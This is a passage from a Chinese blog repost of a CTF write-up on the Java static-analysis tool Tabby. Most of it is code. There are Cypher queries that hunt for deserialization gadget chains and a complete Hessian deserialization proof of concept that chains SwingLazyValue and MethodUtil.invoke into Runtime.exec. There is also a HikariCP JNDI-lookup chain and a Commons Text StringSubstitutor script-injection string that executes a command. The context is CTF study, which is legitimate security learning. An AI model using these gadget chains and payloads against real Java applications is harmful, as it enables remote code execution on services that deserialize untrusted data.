class="line">Method) where source.NAME in [&quot;equals&quot;,&quot;hashCode&quot;,&quot;compareTo&quot;] </span><br><span class="line">with collect(source) as sources</span><br><span class="line">match (sink:</span><br><span class="line">Method &#123;IS_SINK:</span><br><span class="line">true&#125;) where sink.NAME =~ &quot;invoke&quot; and sink.VUL =~ &quot;CODE&quot; and sink.CLASSNAME =~ &quot;java.lang.reflect.Method&quot;</span><br><span class="line">with sources, collect(sink) as sinks</span><br><span class="line">call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path </span><br><span class="line">where none(n in nodes(path) where (n.CLASSNAME =~ &quot;java.util.Iterator&quot; or n.CLASSNAME =~ &quot;java.util.Enumeration&quot; or n.CLASSNAME =~ &quot;java.util.Map&quot; or n.CLASSNAME =~ &quot;java.util.List&quot; or n.CLASSNAME=~&quot;jdk.nashorn.internal.ir.UnaryNode&quot; or n.CLASSNAME=~&quot;com.sun.jndi.ldap.ClientId&quot; or n.CLASSNAME=~&quot;org.apache.catalina.webresources.TrackedInputStream&quot;))</span><br><span class="line">return path limit 1</span><br><span class="line">1.目标方法需要为public 和 static的</span><br><span class="line">2.sink可以为代码执行，写文件，远程类加载等</span><br><span class="line">match (m1:</span><br><span class="line">Method) where m1.VUL=&quot;CODE&quot; and m1.IS_STATIC=true and m1.IS_PUBLIC=true</span><br><span class="line">return m1 limit 50</span><br><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.caucho.hessian.io.SerializerFactory;</span><br><span class="line">import marshalsec.util.Reflections;</span><br><span class="line">import sun.reflect.misc.MethodUtil;</span><br><span class="line">import sun.swing.SwingLazyValue;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.lang.reflect.Array;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        SerializerFactory serializerFactory = new SerializerFactory();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(true);</span><br><span class="line">        Class&lt;?&gt; cMimeTypeParameterList = Class.forName(&quot;java.awt.datatransfer.MimeTypeParameterList&quot;);</span><br><span class="line">        Constructor&lt;?&gt; conMimeTypeParameterList= cMimeTypeParameterList.getDeclaredConstructor();</span><br><span class="line">        conMimeTypeParameterList.setAccessible(true);</span><br><span class="line">        Object mimeTypeParameterList = conMimeTypeParameterList.newInstance();</span><br><span class="line">        Field fparameters = cMimeTypeParameterList.getDeclaredField(&quot;parameters&quot;);</span><br><span class="line">        fparameters.setAccessible(true);</span><br><span class="line">        Hashtable&lt;String, String&gt; stringHashtable = new Hashtable&lt;&gt;();</span><br><span class="line">        stringHashtable.put(&quot;abc&quot;,&quot;xxxxxxxxxxxx&quot;);</span><br><span class="line"></span><br><span class="line">        Method invoke = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);</span><br><span class="line">        Method mexec = Runtime.class.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        Object runtime = Runtime.getRuntime();</span><br><span class="line">        Object[] ags = new Object[]&#123;invoke, new Object(), new Object[]&#123;mexec,runtime , new Object[]&#123;&quot;calc&quot;&#125;&#125;&#125;;</span><br><span class="line">        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;, &quot;invoke&quot;,ags);</span><br><span class="line">        Object[] keyValueList = new Object[]&#123;&quot;abc&quot;,swingLazyValue&#125;;</span><br><span class="line">        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);</span><br><span class="line">        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = new Hashtable&lt;&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = new Hashtable&lt;&gt;();</span><br><span class="line">        hashtable1.put(&quot;a&quot;,uiDefaults1);</span><br><span class="line">        hashtable2.put(&quot;a&quot;,uiDefaults2);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        try &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));</span><br><span class="line">        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));</span><br><span class="line">        Reflections.setFieldValue(s, &quot;table&quot;, tbl);</span><br><span class="line">        Hessian2Output hessian2Output = new Hessian2Output(new FileOutputStream(&quot;hessian.ser&quot;));</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        fparameters.set(mimeTypeParameterList,uiDefaults1);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">        Hessian2Input hessian2Input = new Hessian2Input(new FileInputStream(&quot;hessian.ser&quot;));</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">match path=(m1:</span><br><span class="line">Method)-[:</span><br><span class="line">CALL*..10]-&gt;(m2:</span><br><span class="line">Method &#123;IS_SINK:</span><br><span class="line">true&#125;) where m1.NAME =~ &quot;get.*&quot; and m1.PARAMETER_SIZE=0 and m2.VUL=&quot;JNDI&quot; and m2.NAME=&quot;lookup&quot;</span><br><span class="line">return path limit 2</span><br><span class="line">com.zaxxer.hikari.HikariDataSource#getConnection()</span><br><span class="line">com.zaxxer.hikari.pool.HikariPool.</span><br><span class="line">com.zaxxer.hikari.pool.PoolBase.initializeDataSource</span><br><span class="line">javax.naming.InitialContext.lookup</span><br><span class="line">StringSubstitutor interpolator = StringSubstitutor.createInterpolator();</span><br><span class="line">interpolator.replace(&quot;$&#123;script:js:</span><br><span class="line">java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)&#125;&quot;);</span><br><span class="line">&#123;&quot;name&quot;:&quot;javax.script.ScriptEngine&quot;, &quot;rules&quot;: [&#123;&quot;function&quot;: &quot;eval&quot;, &quot;type&quot;: &quot;sink&quot;, &quot;vul&quot;: &quot;ScriptEval&quot;, &quot;actions&quot;: &#123;&#125;, &quot;polluted&quot;: [0], &quot;signatures&quot;: [&quot;&lt;javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)&gt;&quot;]&#125;]&#125;</span><br><span class="line">match (source:</span><br><span class="line">Method) where source.NAME=&quot;replace&quot; and source.CLASSNAME=&quot;org.apache.commons.text.StringSubstitutor&quot;</span><br><span class="line">with collect(source) as sources</span><br><span class="line">match (sink:</span><br><span class="line">Method &#123;IS_SINK:</span><br><span class="line">true&#125;) where sink.VUL =~ &quot;ScriptEval&quot;</span><br><span class="line">with sources, collect(sink) as sinks</span><br><span class="line">call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path </span><br><span class="line">where none(n in nodes(path) where (n.CLASSNAME =~ &quot;java.util.Iterator&quot; or n.CLASSNAME =~ &quot;java.util.Enumeration&quot; or n.CLASSNAME =~ &quot;java.util.Map&quot; or n.CLASSNAME =~ &quot;java.util.List&quot; ))</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/64572.html">https://www.ctfiot.com/64572.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/Java%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7Tabby%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8.full.md">CTF大赛WP集合&#x2F;articles&#x2F;Java代码分析工具Tabby在CTF中的运用.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Tabby/">Tabby</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Misc/HKCERT_CTF_2022_Postmortem_-III-_The_Remaining_Challenges/" title="HKCERT CTF 2022 Postmortem (III): The Remaining Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HKCERT CTF 2022 Postmortem (III): The Remaining Challenges</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Misc/MRCTF2022_Writeup/" title="MRCTF 2022 Writeup (JPEG Huffman + AI 口罩攻击)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MRCTF 2022 Writeup (JPEG Huffman + AI 口罩攻击)</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
